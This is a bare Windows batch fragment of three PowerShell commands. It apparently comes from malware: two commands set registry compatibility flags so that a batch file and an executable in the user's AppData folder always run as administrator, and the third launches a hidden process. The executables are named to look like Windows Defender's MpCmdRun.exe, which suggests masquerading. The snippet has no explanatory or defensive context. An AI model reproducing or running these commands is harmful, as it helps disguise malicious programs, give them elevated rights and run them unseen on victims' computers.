powershell New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" -Name %USERPROFILE%\run.bat -Value RUNASADMIN -PropertyType string -Force | Out-Null
powershell New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" -Name %USERPROFILE%\AppData\Roaming\MpCmdStmp.exe -Value RUNASADMIN -PropertyType string -Force | Out-Null

powershell Start-Process "%USERPROFILE%\MpCmdRun.exe" -WindowStyle Hidden
